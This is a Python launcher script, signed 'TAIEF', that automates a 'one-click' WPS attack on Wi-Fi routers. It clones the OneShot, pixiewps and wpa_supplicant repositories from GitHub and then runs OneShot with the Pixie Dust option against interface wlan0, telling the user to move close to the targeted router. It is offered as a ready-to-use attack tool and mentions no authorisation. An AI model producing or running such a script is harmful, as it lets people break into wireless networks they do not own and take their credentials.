
import subprocess
import sys
import os
from pathlib import Path

class Colors:
  
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_header():
    
    print(f"{Colors.GREEN}{Colors.BOLD}")
    print("╔════════════════════════════════════════════════════════════╗")
    print("║     Lightest Oneclick Wireless pentesting wps attack       ║")
    print("║     No error, No Monitor mode! Just chill!!                ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print(f"{Colors.END}")
    
    print(f"{Colors.BLUE}{Colors.BOLD}[📋] Instructions:{Colors.END}")
    print(" 1. Hi, it's TAIEF. It's my first automation script!")
    print(" 2. Checking if the required tools are already installed...")
    
   
    print("")
    print(f"{Colors.YELLOW}[⚙️] ⚠️⚠️ Highly recommended:{Colors.END}")
    print("  • Before starting, Perform a restart on your device!")
    print("  • Turn of your device WiFi setting! Get closest to the targeted router!")


def run_cmd(cmd, cwd=None):
    
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            cwd=cwd,
            capture_output=True,
            text=True,
            timeout=120
        )
        return result.returncode, result.stdout.strip(), result.stderr.strip()
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except Exception as e:
        return -1, "", str(e)

def check_installed(repo_name):
   
    repo_dir = Path.cwd() / repo_name.split("/")[-1].replace(".git", "")
    return repo_dir.exists() and (repo_dir / ".git").exists()

def git_clone_or_update(url):
    
    repo_name = url.split("/")[-1].replace(".git", "")
    repo_dir = Path.cwd() / repo_name
    
    if repo_dir.exists():
        print(f"{Colors.YELLOW}[↻] {repo_name} already exists, updating...{Colors.END}")
        code, out, err = run_cmd(f"cd {repo_name} && git pull")
        if code != 0:
            print(f"{Colors.YELLOW}[⚠️] Could not update {repo_name}: {err}{Colors.END}")
        else:
            print(f"{Colors.GREEN}[✅] {repo_name} updated{Colors.END}")
    else:
        print(f"{Colors.BLUE}[↓] Cloning {repo_name}...{Colors.END}")
        code, out, err = run_cmd(f"git clone {url}")
        if code != 0:
            print(f"{Colors.RED}[❌] Failed to clone {repo_name}: {err}{Colors.END}")
            return False
        else:
            print(f"{Colors.GREEN}[✅] {repo_name} cloned successfully{Colors.END}")
    
    return True

def check_python3():
    
    code, out, err = run_cmd("python3 --version")
    if code != 0:
        print(f"\n{Colors.RED}❌ Python 3 is not installed!{Colors.END}")
        print("Please install Python 3 first:")
        print("  Ubuntu/Debian: sudo apt install python3")
        print("  Kali: Already installed")
        return False
    
    print(f"\n{Colors.GREEN}[🐍] Python 3 detected: {out}{Colors.END}")
    return True

def run_oneshot():
    
    oneshot_dir = Path.cwd() / "OneShot"
    oneshot_script = oneshot_dir / "oneshot.py"
    
    if not oneshot_script.exists():
        print(f"\n{Colors.RED}❌ Error: oneshot.py not found at {oneshot_script}{Colors.END}")
        print(f"Check if OneShot was cloned correctly")
        return False
    
    
    
    
    try:
        os.chdir(str(oneshot_dir))
        print(f"\n{Colors.GREEN}Executing OneShot...{Colors.END}")
        print(f"{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}")
        
        
        os.system("python3 oneshot.py -i wlan0 -K")
    except Exception as e:
        print(f"{Colors.RED}❌ Error running OneShot: {e}{Colors.END}")
        return False
    
    return True

def main():
    
    print_header()
    
    
    if not check_python3():
        sys.exit(1)
    
    
    repos = [
        "https://github.com/rakibxdev/OneShot.git",
        "https://github.com/wiire-a/pixiewps.git",
        "https://github.com/digsrc/wpa_supplicant.git"
    ]
    
    
    success_count = 0
    for repo in repos:
        if git_clone_or_update(repo):
            success_count += 1
    
   
    
    if check_installed("https://github.com/rakibxdev/OneShot.git"):
        run_oneshot()
    else:
        print(f"\n{Colors.RED}❌ OneShot installation failed - cannot run tool{Colors.END}")
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}[✅] Script completed!{Colors.END}")
    print(f"{Colors.BLUE}You can manually run the tools from their respective directories.{Colors.END}")

if __name__ == "__main__":
    main()
